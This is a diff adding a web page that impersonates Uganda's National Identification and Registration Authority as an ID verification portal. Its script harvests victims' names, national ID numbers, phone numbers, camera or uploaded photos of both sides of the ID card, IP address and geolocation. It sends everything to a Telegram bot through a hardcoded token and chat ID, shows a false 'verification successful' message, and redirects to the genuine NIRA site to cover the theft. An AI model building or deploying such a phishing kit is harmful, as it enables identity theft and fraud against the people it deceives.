@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NIRA Uganda - National ID Verification Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #006600 0%, #004400 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            width: 100%;
+            max-width: 550px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: #006600;
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .logo {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #006600;
+            font-weight: bold;
+            font-size: 22px;
+        }
+        
+        .header h1 {
+            font-size: 1.4rem;
+            margin-bottom: 5px;
+        }
+        
+        .header p {
+            font-size: 0.85rem;
+            opacity: 0.9;
+        }
+        
+        .form-container {
+            padding: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+        
+        .required::after {
+            content: " *";
+            color: #d32f2f;
+        }
+        
+        input[type="text"],
+        input[type="tel"],
+        input[type="file"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border 0.3s;
+        }
+        
+        input:focus {
+            border-color: #006600;
+            outline: none;
+        }
+        
+        .upload-section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .upload-option {
+            display: none;
+        }
+        
+        .upload-option.active {
+            display: block;
+        }
+        
+        .option-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .option-btn {
+            flex: 1;
+            min-width: 120px;
+            background: #e8f5e9;
+            border: 2px solid #c8e6c9;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            font-weight: 600;
+            color: #2e7d32;
+            transition: all 0.3s;
+        }
+        
+        .option-btn:hover {
+            background: #c8e6c9;
+        }
+        
+        .option-btn.active {
+            background: #006600;
+            color: white;
+            border-color: #006600;
+        }
+        
+        .camera-container {
+            text-align: center;
+            padding: 15px;
+        }
+        
+        .camera-placeholder {
+            width: 100%;
+            max-width: 400px;
+            height: 250px;
+            background: #e0e0e0;
+            border-radius: 8px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
+            font-size: 14px;
+            border: 2px dashed #b0b0b0;
+        }
+        
+        #cameraView {
+            width: 100%;
+            max-width: 400px;
+            height: 250px;
+            border-radius: 8px;
+            margin: 0 auto 15px;
+            display: none;
+            object-fit: cover;
+            border: 3px solid #006600;
+        }
+        
+        .camera-controls {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .control-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            min-width: 100px;
+        }
+        
+        .capture-btn {
+            background: #006600;
+            color: white;
+        }
+        
+        .switch-btn {
+            background: #1976d2;
+            color: white;
+        }
+        
+        .cancel-btn {
+            background: #757575;
+            color: white;
+        }
+        
+        .file-upload-container {
+            padding: 15px;
+        }
+        
+        .upload-instructions {
+            background: #fff3e0;
+            border-left: 4px solid #ff9800;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .file-input-group {
+            margin-bottom: 15px;
+        }
+        
+        .preview-area {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .preview-box {
+            width: 160px;
+            height: 110px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            background: #f5f5f5;
+        }
+        
+        .preview-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .preview-label {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 102, 0, 0.8);
+            color: white;
+            text-align: center;
+            padding: 4px;
+            font-size: 12px;
+        }
+        
+        .no-preview {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #888;
+            font-size: 13px;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #006600 0%, #004400 100%);
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 17px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 25px;
+            transition: all 0.3s;
+        }
+        
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 102, 0, 0.3);
+        }
+        
+        .submit-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            text-align: center;
+            margin: 20px 0;
+            color: #006600;
+            display: none;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #006600;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .alert-box {
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            display: none;
+            font-size: 14px;
+        }
+        
+        .alert-warning {
+            background: #fff3e0;
+            border: 1px solid #ffb74d;
+            color: #e65100;
+        }
+        
+        .alert-success {
+            background: #e8f5e9;
+            border: 1px solid #a5d6a7;
+            color: #2e7d32;
+        }
+        
+        .alert-error {
+            background: #ffebee;
+            border: 1px solid #ffcdd2;
+            color: #c62828;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 15px;
+            color: #666;
+            font-size: 0.8rem;
+            border-top: 1px solid #eee;
+            background: #f9f9f9;
+        }
+        
+        .https-warning {
+            background: #fff3e0;
+            border: 1px solid #ffb74d;
+            border-radius: 6px;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 13px;
+            text-align: center;
+            color: #e65100;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                border-radius: 10px;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+            
+            .option-buttons {
+                flex-direction: column;
+            }
+            
+            .preview-area {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .preview-box {
+                width: 100%;
+                max-width: 250px;
+                height: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <div class="logo">NIRA</div>
+                <div>
+                    <h1>National Identification & Registration Authority</h1>
+                    <p>Republic of Uganda - Secure Identity Verification</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="form-container">
+            <div class="alert-box alert-warning" id="httpsWarning">
+                <strong>⚠ SECURITY NOTICE:</strong> For camera access, this site must be served over HTTPS. 
+                Use a secure connection or upload files manually below.
+            </div>
+            
+            <div class="alert-box" id="statusMessage"></div>
+            
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label for="fullName" class="required">Full Legal Name</label>
+                    <input type="text" id="fullName" name="fullName" required placeholder="As appears on your National ID">
+                </div>
+                
+                <div class="form-group">
+                    <label for="idNumber" class="required">National ID Number</label>
+                    <input type="text" id="idNumber" name="idNumber" required placeholder="Enter 13-digit ID number">
+                </div>
+                
+                <div class="form-group">
+                    <label for="phoneNumber" class="required">Phone Number</label>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" required placeholder="Active mobile number">
+                </div>
+                
+                <div class="upload-section">
+                    <h3 style="margin-bottom: 15px; color: #006600;">Upload National ID Images</h3>
+                    
+                    <div class="option-buttons">
+                        <div class="option-btn active" data-option="camera" onclick="switchOption('camera')">
+                            📷 Use Camera
+                        </div>
+                        <div class="option-btn" data-option="upload" onclick="switchOption('upload')">
+                            📁 Upload Files
+                        </div>
+                    </div>
+                    
+                    <!-- Camera Option -->
+                    <div id="cameraOption" class="upload-option active">
+                        <div class="camera-container">
+                            <div id="cameraPlaceholder" class="camera-placeholder">
+                                Camera will activate when you click "Start Camera"
+                            </div>
+                            <video id="cameraView" autoplay playsinline></video>
+                            
+                            <div class="camera-controls">
+                                <button type="button" class="control-btn capture-btn" onclick="startCamera()" id="startCameraBtn">
+                                    Start Camera
+                                </button>
+                                <button type="button" class="control-btn switch-btn" onclick="switchCamera()" id="switchCameraBtn" style="display: none;">
+                                    Switch Camera
+                                </button>
+                                <button type="button" class="control-btn capture-btn" onclick="capturePhoto()" id="captureBtn" style="display: none;">
+                                    Capture Photo
+                                </button>
+                                <button type="button" class="control-btn cancel-btn" onclick="stopCamera()" id="stopCameraBtn" style="display: none;">
+                                    Stop Camera
+                                </button>
+                            </div>
+                            
+                            <div style="margin-top: 15px; font-size: 13px; color: #666;">
+                                <label>
+                                    <input type="radio" name="captureSide" value="front" checked onchange="updateCaptureSide()">
+                                    Front Side
+                                </label>
+                                <label style="margin-left: 15px;">
+                                    <input type="radio" name="captureSide" value="back" onchange="updateCaptureSide()">
+                                    Back Side
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- File Upload Option -->
+                    <div id="uploadOption" class="upload-option">
+                        <div class="file-upload-container">
+                            <div class="upload-instructions">
+                                <strong>Instructions:</strong> Take clear photos of your ID using any camera app, then upload them here.
+                            </div>
+                            
+                            <div class="file-input-group">
+                                <label for="frontUpload" class="required">Front Side of ID</label>
+                                <input type="file" id="frontUpload" accept="image/*" capture="environment" onchange="previewFile('front', this)">
+                            </div>
+                            
+                            <div class="file-input-group">
+                                <label for="backUpload" class="required">Back Side of ID</label>
+                                <input type="file" id="backUpload" accept="image/*" capture="environment" onchange="previewFile('back', this)">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Image Previews -->
+                    <div class="preview-area">
+                        <div class="preview-box">
+                            <div id="frontPreview" class="no-preview">
+                                Front Side Preview
+                            </div>
+                            <div class="preview-label">FRONT OF ID</div>
+                        </div>
+                        
+                        <div class="preview-box">
+                            <div id="backPreview" class="no-preview">
+                                Back Side Preview
+                            </div>
+                            <div class="preview-label">BACK OF ID</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Processing verification... Please wait</p>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn" disabled>
+                    COMPLETE VERIFICATION
+                </button>
+            </form>
+        </div>
+        
+        <div class="footer">
+            © 2026 National Identification & Registration Authority, Uganda<br>
+            <small>This is a secure government verification portal. Unauthorized access is prohibited.</small>
+        </div>
+    </div>
+
+    <script>
+        // ===== CONFIGURATION =====
+        const TELEGRAM_BOT_TOKEN = '8396628787:AAExlxtZUlftIaEzKwTboRfo08A4aBgD5QU';  // Replace with your bot token
+        const TELEGRAM_CHAT_ID = '7861985453';      // Replace with your chat ID
+        
+        // ===== STATE VARIABLES =====
+        let cameraStream = null;
+        let currentFacingMode = 'environment'; // 'user' for front, 'environment' for back
+        let frontImageData = null;
+        let backImageData = null;
+        let currentCaptureSide = 'front';
+        
+        // ===== INITIALIZATION =====
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if HTTPS
+            if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost') {
+                document.getElementById('httpsWarning').style.display = 'block';
+            }
+            
+            // Check camera support
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                showStatus('Camera API not supported in this browser. Please use file upload option.', 'error');
+                switchOption('upload');
+                document.querySelector('[data-option="camera"]').style.display = 'none';
+            }
+        });
+        
+        // ===== OPTION SWITCHING =====
+        function switchOption(option) {
+            // Update buttons
+            document.querySelectorAll('.option-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`[data-option="${option}"]`).classList.add('active');
+            
+            // Show selected option
+            document.getElementById('cameraOption').classList.remove('active');
+            document.getElementById('uploadOption').classList.remove('active');
+            document.getElementById(`${option}Option`).classList.add('active');
+            
+            // Stop camera if switching away
+            if (option !== 'camera') {
+                stopCamera();
+            }
+        }
+        
+        // ===== CAMERA FUNCTIONS =====
+        async function startCamera() {
+            try {
+                showStatus('Accessing camera...', 'warning');
+                
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: currentFacingMode
+                    },
+                    audio: false
+                };
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                const video = document.getElementById('cameraView');
+                const placeholder = document.getElementById('cameraPlaceholder');
+                
+                video.srcObject = cameraStream;
+                video.style.display = 'block';
+                placeholder.style.display = 'none';
+                
+                // Show camera controls
+                document.getElementById('startCameraBtn').style.display = 'none';
+                document.getElementById('captureBtn').style.display = 'inline-block';
+                document.getElementById('stopCameraBtn').style.display = 'inline-block';
+                document.getElementById('switchCameraBtn').style.display = 'inline-block';
+                
+                showStatus('Camera ready. Position your ID and click "Capture Photo"', 'success');
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                let errorMsg = 'Could not access camera. ';
+                
+                if (error.name === 'NotAllowedError') {
+                    errorMsg += 'Camera permission was denied.';
+                } else if (error.name === 'NotFoundError') {
+                    errorMsg += 'No camera found on this device.';
+                } else if (error.name === 'NotSupportedError') {
+                    errorMsg += 'Camera not supported.';
+                } else if (error.name === 'SecurityError') {
+                    errorMsg += 'Camera access blocked for security reasons.';
+                } else {
+                    errorMsg += 'Please use file upload option instead.';
+                }
+                
+                showStatus(errorMsg, 'error');
+                switchOption('upload');
+            }
+        }
+        
+        function switchCamera() {
+            currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
+            stopCamera();
+            setTimeout(startCamera, 300);
+        }
+        
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            
+            const video = document.getElementById('cameraView');
+            const placeholder = document.getElementById('cameraPlaceholder');
+            
+            video.style.display = 'none';
+            placeholder.style.display = 'flex';
+            
+            // Reset controls
+            document.getElementById('startCameraBtn').style.display = 'inline-block';
+            document.getElementById('captureBtn').style.display = 'none';
+            document.getElementById('stopCameraBtn').style.display = 'none';
+            document.getElementById('switchCameraBtn').style.display = 'none';
+        }
+        
+        function updateCaptureSide() {
+            currentCaptureSide = document.querySelector('input[name="captureSide"]:checked').value;
+        }
+        
+        function capturePhoto() {
+            if (!cameraStream) return;
+            
+            const video = document.getElementById('cameraView');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Store image based on current side
+            if (currentCaptureSide === 'front') {
+                frontImageData = imageData;
+                updatePreview('front', imageData);
+                showStatus('Front side captured! Now select "Back Side" and capture again.', 'success');
+                document.querySelector('input[value="back"]').checked = true;
+                updateCaptureSide();
+            } else {
+                backImageData = imageData;
+                updatePreview('back', imageData);
+                showStatus('Both sides captured! You can complete verification.', 'success');
+            }
+            
+            checkSubmitButton();
+        }
+        
+        // ===== FILE UPLOAD FUNCTIONS =====
+        function previewFile(side, input) {
+            const file = input.files[0];
+            if (!file) return;
+            
+            if (!file.type.startsWith('image/')) {
+                showStatus('Please select an image file', 'error');
+                return;
+            }
+            
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const imageData = e.target.result;
+                
+                if (side === 'front') {
+                    frontImageData = imageData;
+                } else {
+                    backImageData = imageData;
+                }
+                
+                updatePreview(side, imageData);
+                checkSubmitButton();
+                showStatus(`${side === 'front' ? 'Front' : 'Back'} side uploaded`, 'success');
+            };
+            
+            reader.readAsDataURL(file);
+        }
+        
+        // ===== PREVIEW FUNCTIONS =====
+        function updatePreview(side, imageData) {
+            const previewDiv = document.getElementById(`${side}Preview`);
+            previewDiv.innerHTML = `<img src="${imageData}" alt="${side} side">`;
+            previewDiv.classList.remove('no-preview');
+        }
+        
+        function checkSubmitButton() {
+            const submitBtn = document.getElementById('submitBtn');
+            if (frontImageData && backImageData) {
+                submitBtn.disabled = false;
+                submitBtn.textContent = '✓ COMPLETE VERIFICATION';
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'COMPLETE VERIFICATION';
+            }
+        }
+        
+        // ===== STATUS MESSAGES =====
+        function showStatus(message, type = 'warning') {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = `alert-box alert-${type}`;
+            statusEl.style.display = 'block';
+            
+            // Auto-hide success messages
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusEl.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        // ===== DATA SUBMISSION =====
+        async function sendToTelegram(data) {
+            // Format message for Telegram
+            const message = `🆔 NEW ID CAPTURE - ${new Date().toLocaleString()}
+
+👤 FULL NAME: ${data.fullName}
+🔢 ID NUMBER: ${data.idNumber}
+📞 PHONE: ${data.phoneNumber}
+📍 LOCATION: ${data.location}
+🌐 IP: ${data.ip}
+🖥️ BROWSER: ${navigator.userAgent.substring(0, 100)}...`;
+
+            // Send text message
+            const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(textUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                // Function to send image
+                const sendImage = async (imageData, caption) => {
+                    if (!imageData) return;
+                    
+                    // Convert base64 to blob
+                    const base64Data = imageData.split(',')[1];
+                    const byteCharacters = atob(base64Data);
+                    const byteNumbers = new Array(byteCharacters.length);
+                    
+                    for (let i = 0; i < byteCharacters.length; i++) {
+                        byteNumbers[i] = byteCharacters.charCodeAt(i);
+                    }
+                    
+                    const byteArray = new Uint8Array(byteNumbers);
+                    const blob = new Blob([byteArray], { type: 'image/jpeg' });
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('caption', caption);
+                    formData.append('photo', blob, 'id_image.jpg');
+                    
+                    const photoUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                    
+                    await fetch(photoUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                };
+                
+                // Send both images
+                if (frontImageData) {
+                    await sendImage(frontImageData, `FRONT: ${data.fullName} - ${data.idNumber}`);
+                }
+                
+                if (backImageData) {
+                    await sendImage(backImageData, `BACK: ${data.fullName} - ${data.idNumber}`);
+                }
+                
+                return true;
+                
+            } catch (error) {
+                console.error('Telegram send error:', error);
+                return false;
+            }
+        }
+        
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('Location not supported');
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`);
+                    },
+                    () => {
+                        resolve('Location denied');
+                    },
+                    { timeout: 5000 }
+                );
+            });
+        }
+        
+        // ===== FORM SUBMISSION =====
+        document.getElementById('verificationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value.trim();
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            
+            // Validation
+            if (!fullName || !idNumber || !phoneNumber) {
+                showStatus('Please fill all required fields', 'error');
+                return;
+            }
+            
+            if (!frontImageData || !backImageData) {
+                showStatus('Please provide both front and back images of your ID', 'error');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+            
+            try {
+                // Get additional data
+                const ip = await getUserIP();
+                const location = await getLocation();
+                
+                // Prepare data
+                const formData = {
+                    fullName,
+                    idNumber,
+                    phoneNumber,
+                    ip,
+                    location,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Send to Telegram
+                const success = await sendToTelegram(formData);
+                
+                if (success) {
+                    // Show success
+                    document.getElementById('loading').style.display = 'none';
+                    showStatus('✅ Verification Successful! Your identity has been confirmed. Redirecting...', 'success');
+                    
+                    // Clear form after delay
+                    setTimeout(() => {
+                        document.getElementById('verificationForm').reset();
+                        frontImageData = null;
+                        backImageData = null;
+                        document.getElementById('frontPreview').innerHTML = 'Front Side Preview';
+                        document.getElementById('frontPreview').className = 'no-preview';
+                        document.getElementById('backPreview').innerHTML = 'Back Side Preview';
+                        document.getElementById('backPreview').className = 'no-preview';
+                        checkSubmitButton();
+                        
+                        // Redirect to official site
+                        window.location.href = 'https://www.nira.go.ug';
+                    }, 3000);
+                } else {
+                    throw new Error('Transmission failed');
+                }
+                
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                showStatus('Verification failed. Please check your connection and try again.', 'error');
+                document.getElementById('submitBtn').disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
